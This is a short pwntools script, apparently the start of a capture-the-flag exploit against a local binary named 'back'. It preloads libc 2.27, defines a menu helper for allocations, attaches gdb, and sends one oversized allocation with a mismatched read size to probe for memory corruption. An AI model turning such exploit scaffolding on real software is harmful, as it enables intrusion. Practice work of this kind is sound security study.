from pwn import *

io = process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})


def add(alsize,rsize,data):
    io.sendlineafter("> ","1")
    io.sendlineafter("alloc size: ",str(alsize))
    io.sendlineafter("read size: ",str(rsize))
    io.sendlineafter("data: ",data)



gdb.attach(io)
add(0x1ffff0,6215505,"aaaaaa")
io.interactive()
